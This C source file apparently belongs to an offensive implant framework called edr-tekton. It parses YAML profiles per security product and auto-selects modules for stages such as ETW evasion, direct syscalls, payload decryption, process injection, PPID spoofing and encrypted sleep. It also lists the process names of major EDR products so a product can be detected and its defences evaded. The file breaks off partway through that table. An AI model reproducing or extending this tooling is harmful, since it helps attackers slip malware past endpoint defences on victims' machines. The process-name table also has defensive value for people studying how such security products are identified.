/*
 * edr-tekton :: EDR Profile System & Selector Engine
 *
 * Parses YAML profile files into TEKTON_EDR_PROFILE structs,
 * manages a global profile registry, and auto-composes pipelines
 * by selecting optimal modules per stage based on EDR threat
 * levels, risk budgets, and module compatibility.
 *
 * Reuses the cfg_node YAML parsing infrastructure from config.c.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include "tekton/core/profile.h"
#include "tekton/core/builder.h"
#include "tekton/core/log.h"

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#else
#include <dirent.h>
#endif

/* ── Global Profile Registry ─────────────────────────── */

static TEKTON_PROFILE_REGISTRY g_profile_registry = { 0 };

PTEKTON_PROFILE_REGISTRY TektonProfileGetRegistry(void) {
    return &g_profile_registry;
}

/* ── Vendor Name Conversion ──────────────────────────── */

typedef struct {
    TEKTON_EDR_VENDOR   id;
    const char*         name;
    const char*         display;
} VENDOR_MAP_ENTRY;

static const VENDOR_MAP_ENTRY g_vendor_map[] = {
    { TEKTON_EDR_CROWDSTRIKE,   "crowdstrike",  "CrowdStrike Falcon"        },
    { TEKTON_EDR_SENTINELONE,   "sentinelone",  "SentinelOne Singularity"   },
    { TEKTON_EDR_DEFENDER,      "defender",      "Microsoft Defender"        },
    { TEKTON_EDR_SOPHOS,        "sophos",        "Sophos Intercept X"        },
    { TEKTON_EDR_CARBON_BLACK,  "carbon_black",  "VMware Carbon Black"      },
    { TEKTON_EDR_ELASTIC,       "elastic",       "Elastic Security"          },
    { TEKTON_EDR_CORTEX,        "cortex",        "Palo Alto Cortex XDR"      },
    { TEKTON_EDR_ESET,          "eset",          "ESET Endpoint"             },
    { TEKTON_EDR_KASPERSKY,     "kaspersky",     "Kaspersky EDR"             },
    { TEKTON_EDR_BITDEFENDER,   "bitdefender",   "Bitdefender GravityZone"   },
    { TEKTON_EDR_GENERIC,       "generic",       "Generic / Unknown EDR"     },
    { TEKTON_EDR_NONE,          "none",          "No EDR Detected"           },
    { TEKTON_EDR_UNKNOWN,       "unknown",       "Unknown"                   },
};

#define VENDOR_MAP_COUNT (sizeof(g_vendor_map) / sizeof(g_vendor_map[0]))

const char* TektonVendorToString(TEKTON_EDR_VENDOR vendor) {
    for (DWORD i = 0; i < VENDOR_MAP_COUNT; i++) {
        if (g_vendor_map[i].id == vendor) return g_vendor_map[i].display;
    }
    return "Unknown";
}

TEKTON_EDR_VENDOR TektonStringToVendor(const char* name) {
    if (!name) return TEKTON_EDR_UNKNOWN;

    /* Case-insensitive comparison */
    for (DWORD i = 0; i < VENDOR_MAP_COUNT; i++) {
        const char* a = name;
        const char* b = g_vendor_map[i].name;
        BOOL match = TRUE;
        while (*a && *b) {
            if (tolower((unsigned char)*a) != tolower((unsigned char)*b)) {
                match = FALSE;
                break;
            }
            a++; b++;
        }
        if (match && *a == '\0' && *b == '\0') return g_vendor_map[i].id;
    }

    return TEKTON_EDR_UNKNOWN;
}

/* ── Threat Level Parsing ────────────────────────────── */

static TEKTON_THREAT_LEVEL parse_threat_level(const char* str) {
    if (!str) return TEKTON_THREAT_NONE;

    if (strcmp(str, "none") == 0)        return TEKTON_THREAT_NONE;
    if (strcmp(str, "low") == 0)         return TEKTON_THREAT_LOW;
    if (strcmp(str, "medium") == 0)      return TEKTON_THREAT_MEDIUM;
    if (strcmp(str, "high") == 0)        return TEKTON_THREAT_HIGH;
    if (strcmp(str, "critical") == 0)    return TEKTON_THREAT_CRITICAL;

    return TEKTON_THREAT_NONE;
}

/* ── Surface Name Mapping ────────────────────────────── */

typedef struct {
    const char*     yaml_key;
    TEKTON_SURFACE  surface;
} SURFACE_MAP_ENTRY;

static const SURFACE_MAP_ENTRY g_surface_map[] = {
    { "user_hooks",     TEKTON_SURFACE_USER_HOOKS   },
    { "kernel_cb",      TEKTON_SURFACE_KERNEL_CB    },
    { "etw",            TEKTON_SURFACE_ETW          },
    { "minifilter",     TEKTON_SURFACE_MINIFILTER   },
    { "wfp",            TEKTON_SURFACE_WFP          },
    { "scanner",        TEKTON_SURFACE_SCANNER      },
    { "elam",           TEKTON_SURFACE_ELAM         },
    { "nirvana",        TEKTON_SURFACE_NIRVANA      },
    { "hypervisor",     TEKTON_SURFACE_HYPERVISOR   },
};

#define SURFACE_MAP_COUNT (sizeof(g_surface_map) / sizeof(g_surface_map[0]))

/* ── Stage Name Mapping ──────────────────────────────── */

typedef struct {
    const char*     yaml_key;
    TEKTON_STAGE    stage;
} STAGE_MAP_ENTRY;

static const STAGE_MAP_ENTRY g_stage_map[] = {
    { "fingerprint",    TEKTON_STAGE_FINGERPRINT    },
    { "api_resolve",    TEKTON_STAGE_API_RESOLVE    },
    { "evasion_pre",    TEKTON_STAGE_EVASION_PRE    },
    { "syscall_init",   TEKTON_STAGE_SYSCALL_INIT   },
    { "decrypt",        TEKTON_STAGE_DECRYPT        },
    { "inject",         TEKTON_STAGE_INJECT         },
    { "sleep_init",     TEKTON_STAGE_SLEEP_INIT     },
    { "cleanup",        TEKTON_STAGE_CLEANUP        },
};

#define STAGE_MAP_COUNT (sizeof(g_stage_map) / sizeof(g_stage_map[0]))

/* ── Internal YAML Helpers (reused from config.c infra) ── */

static void prof_trim(char* str) {
    char* start = str;
    while (*start && isspace((unsigned char)*start)) start++;
    if (start != str) memmove(str, start, strlen(start) + 1);

    size_t len = strlen(str);
    while (len > 0 && isspace((unsigned char)str[len - 1])) {
        str[--len] = '\0';
    }

    /* Strip surrounding quotes */
    len = strlen(str);
    if (len >= 2 && ((str[0] == '"' && str[len-1] == '"') ||
                     (str[0] == '\'' && str[len-1] == '\''))) {
        memmove(str, str + 1, len - 2);
        str[len - 2] = '\0';
    }
}

static PTEKTON_CFG_NODE prof_node_create(void) {
    return (PTEKTON_CFG_NODE)calloc(1, sizeof(TEKTON_CFG_NODE));
}

static void prof_node_free(PTEKTON_CFG_NODE node) {
    if (!node) return;
    for (DWORD i = 0; i < node->child_count; i++) {
        prof_node_free(node->children[i]);
    }
    free(node);
}

static PTEKTON_CFG_NODE prof_node_add_child(PTEKTON_CFG_NODE parent) {
    if (!parent || parent->child_count >= TEKTON_CFG_MAX_CHILDREN) return NULL;
    PTEKTON_CFG_NODE child = prof_node_create();
    if (!child) return NULL;
    child->parent = parent;
    parent->children[parent->child_count++] = child;
    return child;
}

static int prof_indent(const char* line) {
    int n = 0;
    while (*line == ' ') { n++; line++; }
    return n / 2;
}

static BOOL prof_skip_line(const char* line) {
    while (*line && isspace((unsigned char)*line)) line++;
    return (*line == '#' || *line == '\0' || *line == '\n');
}

/* ── YAML Parser (profile-schema aware) ──────────────── */

static TEKTON_STATUS prof_parse_yaml(
    const char*         yaml,
    SIZE_T              len,
    PTEKTON_CFG_NODE    root
) {
    const char* pos = yaml;
    const char* end = yaml + len;

    PTEKTON_CFG_NODE stack[32];
    int stack_depth = 0;
    stack[0] = root;

    char buf[1024];

    while (pos < end) {
        const char* eol = pos;
        while (eol < end && *eol != '\n') eol++;

        size_t line_len = (size_t)(eol - pos);
        if (line_len >= sizeof(buf)) line_len = sizeof(buf) - 1;
        memcpy(buf, pos, line_len);
        buf[line_len] = '\0';
        pos = eol + 1;

        if (prof_skip_line(buf)) continue;

        /* Handle multi-line folded scalars (notes: >) */
        int indent = prof_indent(buf);
        char trimmed[1024];
        snprintf(trimmed, sizeof(trimmed), "%s", buf);
        prof_trim(trimmed);

        /* List item */
        if (trimmed[0] == '-') {
            char* val = trimmed + 1;
            while (*val && isspace((unsigned char)*val)) val++;

            while (stack_depth > indent && stack_depth > 0) stack_depth--;

            PTEKTON_CFG_NODE item = prof_node_add_child(stack[stack_depth]);
            if (!item) continue;

            /* Check for inline map: "- { type: xor, key_source: static }" */
            if (val[0] == '{') {
                item->type = TEKTON_CFG_MAP;
                char* p = val + 1;
                while (*p && *p != '}') {
                    while (*p && isspace((unsigned char)*p)) p++;
                    char* k = p;
                    while (*p && *p != ':' && *p != '}') p++;
                    if (*p == ':') {
                        *p++ = '\0';
                        while (*p && isspace((unsigned char)*p)) p++;
                        char* v = p;
                        while (*p && *p != ',' && *p != '}') p++;
                        char saved = *p;
                        if (*p) *p++ = '\0';

                        PTEKTON_CFG_NODE field = prof_node_add_child(item);
                        if (field) {
                            prof_trim(k);
                            prof_trim(v);
                            snprintf(field->key, TEKTON_CFG_MAX_KEY, "%s", k);
                            snprintf(field->value, TEKTON_CFG_MAX_VALUE, "%s", v);
                            field->type = TEKTON_CFG_STRING;
                        }
                        if (saved == '}') break;
                    } else break;
                }
            } else {
                item->type = TEKTON_CFG_STRING;
                prof_trim(val);
                snprintf(item->value, TEKTON_CFG_MAX_VALUE, "%s", val);
            }
            continue;
        }

        /* Key: value */
        char* colon = strchr(trimmed, ':');
        if (!colon) continue;

        *colon = '\0';
        char* key = trimmed;
        char* value = colon + 1;
        prof_trim(key);
        prof_trim(value);

        /* Strip inline comments (only outside quotes) */
        if (value[0] != '"' && value[0] != '\'') {
            char* hash = strchr(value, '#');
            if (hash) {
                *hash = '\0';
                prof_trim(value);
            }
        }

        while (stack_depth > indent && stack_depth > 0) stack_depth--;

        PTEKTON_CFG_NODE node = prof_node_add_child(stack[stack_depth]);
        if (!node) continue;

        snprintf(node->key, TEKTON_CFG_MAX_KEY, "%s", key);

        if (value[0] == '\0' || strcmp(value, ">") == 0) {
            /* Map node or folded scalar */
            node->type = TEKTON_CFG_MAP;

            if (strcmp(value, ">") == 0) {
                /* Folded scalar: read continuation lines */
                char folded[512];
                folded[0] = '\0';
                size_t folded_len = 0;

                while (pos < end) {
                    const char* next_eol = pos;
                    while (next_eol < end && *next_eol != '\n') next_eol++;

                    size_t next_len = (size_t)(next_eol - pos);
                    char next_buf[1024];
                    if (next_len >= sizeof(next_buf)) next_len = sizeof(next_buf) - 1;
                    memcpy(next_buf, pos, next_len);
                    next_buf[next_len] = '\0';

                    int next_indent = prof_indent(next_buf);
                    if (next_indent <= indent && !prof_skip_line(next_buf)) break;
                    if (prof_skip_line(next_buf)) { pos = next_eol + 1; continue; }

                    prof_trim(next_buf);
                    if (folded_len > 0 && folded_len < sizeof(folded) - 2) {
                        folded[folded_len++] = ' ';
                    }
                    size_t add = strlen(next_buf);
                    if (folded_len + add < sizeof(folded) - 1) {
                        memcpy(folded + folded_len, next_buf, add);
                        folded_len += add;
                    }
                    pos = next_eol + 1;
                }
                folded[folded_len] = '\0';
                snprintf(node->value, TEKTON_CFG_MAX_VALUE, "%s", folded);
                node->type = TEKTON_CFG_STRING;
            } else {
                if (indent + 1 < 32) {
                    stack[indent + 1] = node;
                    stack_depth = indent + 1;
                }
            }
        } else if (value[0] == '[') {
            /* Inline list */
            node->type = TEKTON_CFG_LIST;
            snprintf(node->value, TEKTON_CFG_MAX_VALUE, "%s", value);

            char* p = value + 1;
            while (*p && *p != ']') {
                while (*p && isspace((unsigned char)*p)) p++;
                char* item_start = p;
                while (*p && *p != ',' && *p != ']') p++;
                char saved = *p;
                *p = '\0';

                PTEKTON_CFG_NODE child = prof_node_add_child(node);
                if (child) {
                    prof_trim(item_start);
                    snprintf(child->value, TEKTON_CFG_MAX_VALUE, "%s", item_start);
                    child->type = TEKTON_CFG_STRING;
                }
                if (saved == ']') break;
                if (saved == ',') p++;
            }
        } else {
            node->type = TEKTON_CFG_STRING;
            snprintf(node->value, TEKTON_CFG_MAX_VALUE, "%s", value);
        }
    }

    return TEKTON_OK;
}

/* ── Node Lookup (dotted path) ───────────────────────── */

static PTEKTON_CFG_NODE prof_find(PTEKTON_CFG_NODE root, const char* path) {
    if (!root || !path) return NULL;

    char buf[512];
    snprintf(buf, sizeof(buf), "%s", path);

    PTEKTON_CFG_NODE cur = root;
    char* tok = strtok(buf, ".");

    while (tok && cur) {
        BOOL found = FALSE;
        for (DWORD i = 0; i < cur->child_count; i++) {
            if (strcmp(cur->children[i]->key, tok) == 0) {
                cur = cur->children[i];
                found = TRUE;
                break;
            }
        }
        if (!found) return NULL;
        tok = strtok(NULL, ".");
    }

    return cur;
}

static const char* prof_get(PTEKTON_CFG_NODE root, const char* path) {
    PTEKTON_CFG_NODE n = prof_find(root, path);
    if (!n || n->value[0] == '\0') return NULL;
    return n->value;
}

static int prof_get_int(PTEKTON_CFG_NODE root, const char* path, int def) {
    const char* v = prof_get(root, path);
    return v ? atoi(v) : def;
}

static BOOL prof_get_bool(PTEKTON_CFG_NODE root, const char* path, BOOL def) {
    const char* v = prof_get(root, path);
    if (!v) return def;
    return (strcmp(v, "true") == 0 || strcmp(v, "yes") == 0 || strcmp(v, "1") == 0);
}

/* ── Profile Parser (YAML -> TEKTON_EDR_PROFILE) ─────── */

static void parse_stage_selection(
    PTEKTON_CFG_NODE        stage_node,
    PTEKTON_STAGE_SELECTION out
) {
    if (!stage_node || !out) return;

    memset(out, 0, sizeof(TEKTON_STAGE_SELECTION));

    /* primary */
    const char* primary = prof_get(stage_node, "primary");
    if (primary) snprintf(out->primary, sizeof(out->primary), "%s", primary);

    /* required */
    out->required = prof_get_bool(stage_node, "required", FALSE);

    /* max_risk */
    out->max_risk = (DWORD)prof_get_int(stage_node, "max_risk", 100);

    /* fallbacks (list node) */
    PTEKTON_CFG_NODE fb_node = prof_find(stage_node, "fallbacks");
    if (fb_node) {
        for (DWORD i = 0; i < fb_node->child_count && i < TEKTON_MAX_FALLBACKS; i++) {
            char val[64];
            snprintf(val, sizeof(val), "%s", fb_node->children[i]->value);
            prof_trim(val);
            snprintf(out->fallbacks[out->fallback_count], 64, "%s", val);
            out->fallback_count++;
        }
    }

    /* additional modules (registered as extra pipeline entries, not fallbacks) */
    /* These are informational in the profile, handled by the selector */
}

TEKTON_STATUS TektonProfileParse(
    const char*         yaml_str,
    SIZE_T              yaml_len,
    PTEKTON_EDR_PROFILE out_profile
) {
    if (!yaml_str || !out_profile) return TEKTON_ERR_INVALID_PARAM;

    memset(out_profile, 0, sizeof(TEKTON_EDR_PROFILE));

    /* Parse into tree */
    PTEKTON_CFG_NODE root = prof_node_create();
    if (!root) return TEKTON_ERR_ALLOC;
    root->type = TEKTON_CFG_MAP;

    TEKTON_STATUS status = prof_parse_yaml(yaml_str, yaml_len, root);
    if (status != TEKTON_OK) {
        prof_node_free(root);
        return status;
    }

    /* ── Extract profile identity ───────────────────── */

    const char* val;

    val = prof_get(root, "profile.name");
    if (val) snprintf(out_profile->name, sizeof(out_profile->name), "%s", val);

    val = prof_get(root, "profile.display_name");
    if (val) {
        snprintf(out_profile->display_name, sizeof(out_profile->display_name), "%s", val);
    }

    val = prof_get(root, "profile.version");
    if (val) snprintf(out_profile->version, sizeof(out_profile->version), "%s", val);

    val = prof_get(root, "profile.vendor");
    if (val) out_profile->vendor = TektonStringToVendor(val);

    /* ── Threat levels per detection surface ─────────── */

    PTEKTON_CFG_NODE threat_node = prof_find(root, "threat_levels");
    if (threat_node) {
        for (DWORD i = 0; i < SURFACE_MAP_COUNT; i++) {
            PTEKTON_CFG_NODE surf = prof_find(threat_node, g_surface_map[i].yaml_key);
            if (surf && surf->value[0]) {
                /* Strip inline comments from threat value */
                char tval[64];
                snprintf(tval, sizeof(tval), "%s", surf->value);
                char* hash = strchr(tval, '#');
                if (hash) { *hash = '\0'; prof_trim(tval); }

                out_profile->threat[g_surface_map[i].surface] = parse_threat_level(tval);
            }
        }
    }

    /* ── Per-stage module selections ─────────────────── */

    PTEKTON_CFG_NODE stages_node = prof_find(root, "stages");
    if (stages_node) {
        for (DWORD i = 0; i < STAGE_MAP_COUNT; i++) {
            PTEKTON_CFG_NODE sn = prof_find(stages_node, g_stage_map[i].yaml_key);
            if (sn) {
                parse_stage_selection(sn, &out_profile->stages[g_stage_map[i].stage]);
            }
        }
    }

    /* ── Global constraints ──────────────────────────── */

    out_profile->max_total_risk = (DWORD)prof_get_int(root, "constraints.max_total_risk", 200);
    out_profile->prefer_stealthy = prof_get_bool(root, "constraints.prefer_stealthy", FALSE);
    out_profile->require_x64 = prof_get_bool(root, "constraints.require_x64", FALSE);
    out_profile->min_os_build = (DWORD)prof_get_int(root, "constraints.min_os_build", 10240);

    /* ── Sleep configuration ─────────────────────────── */

    out_profile->sleep_interval_ms = (DWORD)prof_get_int(root, "sleep.interval_ms", 5000);
    out_profile->sleep_encrypt = prof_get_bool(root, "sleep.encrypt", FALSE);

    /* ── Encryption layers ───────────────────────────── */

    PTEKTON_CFG_NODE enc_node = prof_find(root, "encryption.layers");
    if (enc_node) {
        for (DWORD i = 0; i < enc_node->child_count && i < TEKTON_MAX_ENCRYPT_LAYERS; i++) {
            PTEKTON_CFG_NODE layer = enc_node->children[i];

            /* Each layer is an inline map: { type: aes256, key_source: env } */
            for (DWORD j = 0; j < layer->child_count; j++) {
                if (strcmp(layer->children[j]->key, "type") == 0) {
                    snprintf(out_profile->encrypt_types[out_profile->encrypt_layer_count],
                        32, "%s", layer->children[j]->value);
                }
            }
            out_profile->encrypt_layer_count++;
        }
    }

    /* ── Injection target / PPID parent ──────────────── */

    val = prof_get(root, "inject_target");
    if (val) {
        snprintf(out_profile->inject_target, sizeof(out_profile->inject_target), "%s", val);
    }

    val = prof_get(root, "ppid_parent");
    if (val) {
        snprintf(out_profile->ppid_parent, sizeof(out_profile->ppid_parent), "%s", val);
    }

    /* ── Notes (folded scalar) ───────────────────────── */

    val = prof_get(root, "notes");
    if (val) snprintf(out_profile->notes, sizeof(out_profile->notes), "%s", val);

    prof_node_free(root);

    TLOG_INFO("Profile parsed: %s (%s) vendor=%s",
        out_profile->name,
        out_profile->display_name,
        TektonVendorToString(out_profile->vendor));

    return TEKTON_OK;
}

/* ── Profile File Loader ─────────────────────────────── */

TEKTON_STATUS TektonProfileLoad(
    const char*         path,
    PTEKTON_EDR_PROFILE out_profile
) {
    if (!path || !out_profile) return TEKTON_ERR_INVALID_PARAM;

    FILE* fp = fopen(path, "rb");
    if (!fp) {
        TLOG_ERROR("Cannot open profile: %s", path);
        return TEKTON_ERR_NOT_FOUND;
    }

    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    if (size <= 0 || size > 1024 * 1024) {
        fclose(fp);
        return TEKTON_ERR_CONFIG_PARSE;
    }

    char* yaml = (char*)malloc((size_t)size + 1);
    if (!yaml) {
        fclose(fp);
        return TEKTON_ERR_ALLOC;
    }

    size_t rd = fread(yaml, 1, (size_t)size, fp);
    yaml[rd] = '\0';
    fclose(fp);

    TEKTON_STATUS status = TektonProfileParse(yaml, rd, out_profile);
    free(yaml);
    return status;
}

/* ── Profile Registry ────────────────────────────────── */

TEKTON_STATUS TektonProfileRegister(PTEKTON_EDR_PROFILE profile) {
    if (!profile) return TEKTON_ERR_INVALID_PARAM;

    if (g_profile_registry.count >= TEKTON_MAX_PROFILES) {
        TLOG_ERROR("Profile registry full (%d max)", TEKTON_MAX_PROFILES);
        return TEKTON_ERR_GENERIC;
    }

    /* Check for duplicate name */
    for (DWORD i = 0; i < g_profile_registry.count; i++) {
        if (strcmp(g_profile_registry.profiles[i].name, profile->name) == 0) {
            /* Overwrite existing */
            memcpy(&g_profile_registry.profiles[i], profile, sizeof(TEKTON_EDR_PROFILE));
            TLOG_INFO("Profile updated: %s", profile->name);
            return TEKTON_OK;
        }
    }

    memcpy(&g_profile_registry.profiles[g_profile_registry.count],
        profile, sizeof(TEKTON_EDR_PROFILE));
    g_profile_registry.count++;

    TLOG_INFO("Profile registered: %s (vendor=%s)",
        profile->name, TektonVendorToString(profile->vendor));

    return TEKTON_OK;
}

PTEKTON_EDR_PROFILE TektonProfileFindByVendor(TEKTON_EDR_VENDOR vendor) {
    for (DWORD i = 0; i < g_profile_registry.count; i++) {
        if (g_profile_registry.profiles[i].vendor == vendor) {
            return &g_profile_registry.profiles[i];
        }
    }
    return NULL;
}

PTEKTON_EDR_PROFILE TektonProfileFindByName(const char* name) {
    if (!name) return NULL;

    for (DWORD i = 0; i < g_profile_registry.count; i++) {
        if (strcmp(g_profile_registry.profiles[i].name, name) == 0) {
            return &g_profile_registry.profiles[i];
        }
    }
    return NULL;
}

/* ── Directory Loader ────────────────────────────────── */

TEKTON_STATUS TektonProfileLoadDir(const char* dir_path) {
    if (!dir_path) return TEKTON_ERR_INVALID_PARAM;

#ifdef _WIN32
    char search_path[512];
    snprintf(search_path, sizeof(search_path), "%s\\*.yaml", dir_path);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        TLOG_WARN("No profiles found in: %s", dir_path);
        return TEKTON_OK;
    }

    DWORD loaded = 0;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

        char full_path[512];
        snprintf(full_path, sizeof(full_path), "%s\\%s", dir_path, fd.cFileName);

        TEKTON_EDR_PROFILE profile;
        if (TektonProfileLoad(full_path, &profile) == TEKTON_OK) {
            TektonProfileRegister(&profile);
            loaded++;
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);

    TLOG_INFO("Loaded %lu profiles from: %s", loaded, dir_path);
    return TEKTON_OK;
#else
    /* POSIX directory enumeration for dev builds */
    DIR* dir = opendir(dir_path);
    if (!dir) {
        TLOG_WARN("Cannot open profile directory: %s", dir_path);
        return TEKTON_OK;
    }

    DWORD loaded = 0;
    struct dirent* ent;
    while ((ent = readdir(dir)) != NULL) {
        size_t nlen = strlen(ent->d_name);
        if (nlen < 6) continue;
        if (strcmp(ent->d_name + nlen - 5, ".yaml") != 0) continue;

        char full_path[512];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, ent->d_name);

        TEKTON_EDR_PROFILE profile;
        if (TektonProfileLoad(full_path, &profile) == TEKTON_OK) {
            TektonProfileRegister(&profile);
            loaded++;
        }
    }

    closedir(dir);
    TLOG_INFO("Loaded %u profiles from: %s", loaded, dir_path);
    return TEKTON_OK;
#endif
}

/* ── Module Selector Engine ──────────────────────────── */

/*
 * Try to resolve a module name from the registry.
 * Returns the module pointer if found, compatible, and within
 * the risk threshold. NULL otherwise.
 */
static PTEKTON_MODULE selector_try_module(
    const char*         name,
    PTEKTON_CONTEXT     ctx,
    DWORD               max_risk,
    BOOL                prefer_stealthy
) {
    if (!name || name[0] == '\0') return NULL;

    /* Skip "auto" placeholder */
    if (strcmp(name, "auto") == 0) return NULL;

    PTEKTON_MODULE mod = TektonModuleFind(name);
    if (!mod) {
        TLOG_DEBUG("Module not found: %s", name);
        return NULL;
    }

    /* Compatibility check */
    if (mod->check_compat && !mod->check_compat(mod, ctx)) {
        TLOG_DEBUG("Module incompatible: %s", name);
        return NULL;
    }

    /* Risk check */
    DWORD risk = mod->get_risk_score ? mod->get_risk_score(mod) : 50;
    if (risk > max_risk) {
        TLOG_DEBUG("Module %s risk %lu exceeds max %lu", name, risk, max_risk);
        return NULL;
    }

    /* Stealth preference */
    if (prefer_stealthy && !(mod->flags & TEKTON_MOD_STEALTHY)) {
        TLOG_DEBUG("Module %s not stealthy (preference active)", name);
        /* Don't reject, just note. Stealth is a preference, not a hard filter. */
    }

    return mod;
}

/*
 * Map a pipeline stage to the corresponding config field name
 * for writing the selected module name into TEKTON_CONFIG.
 */
static void selector_write_config(
    PTEKTON_CONFIG  cfg,
    TEKTON_STAGE    stage,
    const char*     module_name
) {
    switch (stage) {
        case TEKTON_STAGE_API_RESOLVE:
            snprintf(cfg->api_resolve, sizeof(cfg->api_resolve), "%s", module_name);
            break;
        case TEKTON_STAGE_EVASION_PRE:
            snprintf(cfg->etw_method, sizeof(cfg->etw_method), "%s", module_name);
            break;
        case TEKTON_STAGE_SYSCALL_INIT:
            snprintf(cfg->syscall_method, sizeof(cfg->syscall_method), "%s", module_name);
            break;
        case TEKTON_STAGE_DECRYPT:
            /* Encryption method stored via encrypt layers */
            break;
        case TEKTON_STAGE_INJECT:
            snprintf(cfg->inject_method, sizeof(cfg->inject_method), "%s", module_name);
            break;
        case TEKTON_STAGE_SLEEP_INIT:
            snprintf(cfg->sleep_method, sizeof(cfg->sleep_method), "%s", module_name);
            break;
        default:
            break;
    }
}

TEKTON_STATUS TektonSelectModules(
    PTEKTON_EDR_PROFILE     profile,
    PTEKTON_CONTEXT         ctx,
    PTEKTON_CONFIG          out_config
) {
    if (!profile || !ctx || !out_config) return TEKTON_ERR_INVALID_PARAM;

    memset(out_config, 0, sizeof(TEKTON_CONFIG));

    /* Copy profile metadata into config */
    snprintf(out_config->profile_name, sizeof(out_config->profile_name),
        "%s", profile->name);
    snprintf(out_config->target_edr, sizeof(out_config->target_edr),
        "%s", TektonVendorToString(profile->vendor));
    snprintf(out_config->target_arch, sizeof(out_config->target_arch),
        "%s", ctx->os.is_x64 ? "x64" : "x86");
    out_config->target_os_build = ctx->os.build_number;

    /* Copy injection/sleep config from profile */
    snprintf(out_config->inject_target, sizeof(out_config->inject_target),
        "%s", profile->inject_target);
    out_config->sleep_interval_ms = profile->sleep_interval_ms;

    /* Copy encryption layers */
    out_config->encrypt_layer_count = 0;
    for (DWORD i = 0; i < profile->encrypt_layer_count && i < TEKTON_MAX_ENCRYPT_LAYERS; i++) {
        snprintf(out_config->encrypt_layers[i].type,
            sizeof(out_config->encrypt_layers[i].type),
            "%s", profile->encrypt_types[i]);
        out_config->encrypt_layer_count++;
    }

    DWORD total_risk = 0;
    DWORD stages_resolved = 0;
    DWORD stages_failed = 0;

    TLOG_INFO("Selecting modules for profile: %s", profile->display_name);

    /* Iterate each pipeline stage */
    for (DWORD s = 0; s < TEKTON_STAGE_MAX; s++) {
        PTEKTON_STAGE_SELECTION sel = &profile->stages[s];

        /* Skip stages with no selection configured */
        if (sel->primary[0] == '\0' && !sel->required) {
            TLOG_DEBUG("Stage %lu: no selection, skipping", s);
            continue;
        }

        /* Skip explicitly disabled stages */
        if (sel->skip) {
            TLOG_DEBUG("Stage %lu: explicitly skipped", s);
            continue;
        }

        /* Skip "auto" primary with no fallbacks (fingerprint, cleanup) */
        if (strcmp(sel->primary, "auto") == 0 && sel->fallback_count == 0) {
            TLOG_DEBUG("Stage %lu: auto (built-in)", s);
            stages_resolved++;
            continue;
        }

        PTEKTON_MODULE chosen = NULL;

        /* Try primary */
        chosen = selector_try_module(sel->primary, ctx, sel->max_risk,
            profile->prefer_stealthy);

        /* Try fallbacks in order */
        if (!chosen) {
            for (DWORD f = 0; f < sel->fallback_count; f++) {
                chosen = selector_try_module(sel->fallbacks[f], ctx,
                    sel->max_risk, profile->prefer_stealthy);
                if (chosen) break;
            }
        }

        if (chosen) {
            DWORD risk = chosen->get_risk_score ? chosen->get_risk_score(chosen) : 50;
            total_risk += risk;

            /* Check cumulative risk budget */
            if (total_risk > profile->max_total_risk) {
                TLOG_WARN("Total risk %lu exceeds budget %lu at stage %lu (%s)",
                    total_risk, profile->max_total_risk, s, chosen->name);
                /* Don't hard-fail here, let the pipeline validator catch it */
            }

            selector_write_config(out_config, (TEKTON_STAGE)s, chosen->name);
            stages_resolved++;

            TLOG_INFO("  Stage %lu: selected '%s' (risk=%lu, total=%lu)",
                s, chosen->name, risk, total_risk);
        } else if (sel->required) {
            TLOG_ERROR("Stage %lu: REQUIRED but no compatible module found "
                "(primary=%s)", s, sel->primary);
            stages_failed++;
        } else {
            TLOG_DEBUG("Stage %lu: optional, no compatible module, skipping", s);
        }
    }

    if (stages_failed > 0) {
        TLOG_ERROR("Module selection failed: %lu required stages unresolved",
            stages_failed);
        return TEKTON_ERR_MODULE_MISSING;
    }

    TLOG_INFO("Module selection complete: %lu stages resolved, total_risk=%lu/%lu",
        stages_resolved, total_risk, profile->max_total_risk);

    return TEKTON_OK;
}

/* ── EDR Auto-Detection ──────────────────────────────── */

/*
 * Process name -> vendor mapping for auto-detection.
 * Each EDR has known process names that run on endpoints.
 */
typedef struct {
    const char*         process_name;
    TEKTON_EDR_VENDOR   vendor;
} PROCESS_VENDOR_MAP;

static const PROCESS_VENDOR_MAP g_process_map[] = {
    /* CrowdStrike Falcon */
    { "csfalconservice",        TEKTON_EDR_CROWDSTRIKE  },
    { "csfalconcontainer",      TEKTON_EDR_CROWDSTRIKE  },
    { "csagent",                TEKTON_EDR_CROWDSTRIKE  },
    { "falconsensor",           TEKTON_EDR_CROWDSTRIKE  },

    /* SentinelOne Singularity */
    { "sentinelagent",          TEKTON_EDR_SENTINELONE  },
    { "sentinelone",            TEKTON_EDR_SENTINELONE  },
    { "sentinelhelper",         TEKTON_EDR_SENTINELONE  },
    { "sentineluiagent",        TEKTON_EDR_SENTINELONE  },

    /* Microsoft Defender */
    { "msmpeng",                TEKTON_EDR_DEFENDER     },
    { "mssense",                TEKTON_EDR_DEFENDER     },
    { "mpcmdrun",               TEKTON_EDR_DEFENDER     },
    { "securityhealthservice",  TEKTON_EDR_DEFENDER     },

    /* Sophos Intercept X */
    { "sophoshealth",           TEKTON_EDR_SOPHOS       },
    { "sophosfilescanner",      TEKTON_EDR_SOPHOS       },
    { "sophosui",               TEKTON_EDR_SOPHOS       },
    { "savservice",             TEKTON_EDR_SOPHOS       },
    { "alu",                    TEKTON_EDR_SOPHOS       },

    /* Carbon Black */
    { "cb",                     TEKTON_EDR_CARBON_BLACK },
    { "cbdefense",              TEKTON_EDR_CARBON_BLACK },
    { "repmgr",                 TEKTON_EDR_CARBON_BLACK },
    { "cbsensor",               TEKTON_EDR_CARBON_BLACK },

    /* Elastic Security */
    { "elastic-agent",          TEKTON_EDR_ELASTIC      },
    { "elastic-endpoint",       TEKTON_EDR_ELASTIC      },
    { "filebeat",               TEKTON_EDR_ELASTIC      },
    { "winlogbeat",             TEKTON_EDR_ELASTIC      },

    /* Palo Alto Cortex XDR */
    { "traps",                  TEKTON_EDR_CORTEX       },
    { "cortex xdr",             TEKTON_EDR_CORTEX       },
